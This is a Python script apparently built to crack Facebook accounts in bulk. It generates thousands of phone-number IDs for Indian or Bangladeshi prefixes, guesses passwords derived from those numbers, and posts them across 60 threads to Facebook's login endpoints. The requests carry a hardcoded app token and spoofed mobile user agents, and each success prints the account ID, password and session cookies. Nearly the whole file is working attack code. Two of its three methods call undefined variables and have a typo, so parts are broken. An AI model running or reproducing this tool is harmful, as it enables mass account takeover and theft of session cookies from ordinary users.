import os,json,time,uuid,sys,random,base64,shutil,re, requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

line="—"*30
logo="""
    ┏┳┓┏┓┏┓┏┳┓
     ┃ ┣ ┗┓ ┃ 
     ┻ ┗┛┗┛ ┻"""







def rn():
    user=[]
    os.system("clear")
    
    limit=3000
    for i in range(limit):
        ga=str(random.choice(range(111111,999999)))
        user.append(ga)
    print(logo)
    print(line)
    print("IND CODE : 9848 9946")
    print("BD CODE : 01711 01811")
    print(line)
    code=input("<~> ")
    print(line)
    print("[1] INDIA PASS")
    print("[2] BD PASS")
    print(line)
    con=input("<#>")
    if con in["1"]:
        pwx=["first6","57273200","first8","57575751","first10","59039200","last6","57575752"]
    else:
        pwx=["first6","first8","last6","last8","number"]
    with ThreadPool(max_workers=60) as heron:
        os.system("clear")
        print(logo)
        print(line)
        print("[1] Method api")
        print("[2] Method graph")
        print("[2] Method b-graph")
        print(line)
        me=input("_-")
        print(line)
        ua=input(" Inject Ua ~> ")
        os.system("clear")
        device=ua.split("FBBD/")[1].split(";")[0].upper()
        os.system("clear")
        print(logo)
        print(line)
        print(" Total Id "+str(limit))
        print(" Ua Device ~> "+device)
        print(line)
        for xd in user:
            uid=code+xd
            if me in ["1"]:
                heron.submit(test_1,uid,pwx,ua)
            elif me in ["2"]:
                heron.submit(test_2,uidpwx,ua)
            else:
                heron.submit(test_3,uid,pwx,ua)

loop=0
oks=[]


def test_1(uid,pwx,ua):
    global loop,oks
    
    sys.stdout.write(f'\r  \033[1;37m~/ [SAVAGE-API\033[1;37m] \033[1;37m<[\033[1;1m{loop}\033[1;00m\033[1;37m]> <[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[1;37m]>\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pwx:
            ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-10:])
            
            add_ua=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'
            
            data={
'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'email': uid,
'password': ps,
'generate_analytics_claims': '1', 
'credentials_type': 'password',
'source': 'login',
'error_detail_type': 'button_with_disabled',
'enroll_misauth': 'false', 
'generate_session_cookies': '1', 
'generate_machine_id': '1', 
'meta_inf_fbmeta': '', 
'currently_logged_in_userid': '0', 
'fb_api_req_friendly_name': 'authenticate'}
           
            head={
'User-Agent': add_ua+ua, 
'Accept-Encoding': 'gzip, deflate', 
'Accept': '*/*', 
'Connection': 'keep-alive', 
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
'X-FB-Friendly-Name': 'authenticate', 
'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 
'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
'X-FB-Connection-Type': 'unknown',
'Content-Type': 'application/x-www-form-urlencoded',
'X-FB-HTTP-Engine': 'Liger'}
            url="https://api.facebook.com/method/auth.login"
            rq=requests.post(url,data=data,headers=head).json()
            
            if "session_key" in rq:
                xd=str(rq["uid"])
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                print(f"\r\r [OK] {xd} | {ps}| {coki}")
                oks.append(xd)
                
                
                break
            
            else:
                continue
        loop+=1
    except Exception as e:
        #print(e)
        time.sleep(50)


def test_2(uid,pwx,ua):
    global loop,oks
    
    sys.stdout.write(f'\r  \033[1;37m~/ [SAVAGE-GRAPH\033[1;37m] \033[1;37m<[\033[1;1m{loop}\033[1;00m\033[1;37m]> <[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[1;37m]>\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pwx:
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            add_ua=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'
            data={'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': uid,'password': ps,'generate_analytics_claims': '1','community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name': 'authenticate'}
            head={
                'Host': 'graph.facebook.com',
                'User-Agent': add_ua+ua,
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'}
            url= f'https://graph.facebook.com/auth/login'
            rq=requests.post(url,data=data,headers=head).json()
            if "session_key" in rq:
                xd=str(rq["uid"])
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                print(f"\r\r [OK] {xd} | {ps}| {coki}")
                oks.append(xd)
                break
            
            else:
                continue
        loop+=1
    except Exception as e:
        #print(e)
        time.sleep(50)


def test_3(uid,pwx,ua):
    global loop,oks
    
    sys.stdout.write(f'\r  \033[1;37m~/ [SAVAGE-GRAPH\033[1;37m] \033[1;37m<[\033[1;1m{loop}\033[1;00m\033[1;37m]> <[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[1;37m]>\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pwx:
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            
            add_ua=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'
            data={'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': uid,'password': ps,'generate_analytics_claims': '1','community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name': 'authenticate'}
            head={
                'Host': 'graph.facebook.com',
                'User-Agent': add_ua+ua,
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'}
            url= f'https://b-graph.facebook.com/auth/login'
            rq=requests.post(url,data=data,headers=head).json()
            if "session_key" in rq:
                xd=str(rq["uid"])
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                print(f"\r\r [OK] {xd} | {ps}| {coki}")
                oks.append(xd)
                break
            
            else:
                continue
        loop+=1
    except Exception as e:
        #print(e)
        time.sleep(50)
        


rn()



